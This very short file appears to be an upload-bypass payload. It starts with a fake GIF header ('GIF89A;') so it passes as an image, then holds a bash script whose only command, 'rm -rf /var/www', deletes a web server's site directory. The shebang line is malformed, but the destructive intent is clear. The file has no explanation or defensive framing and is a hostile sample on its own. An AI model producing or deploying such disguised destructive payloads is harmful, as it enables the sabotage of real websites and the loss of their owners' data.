GIF89A;
#!bin/bash
rm -rf /var/www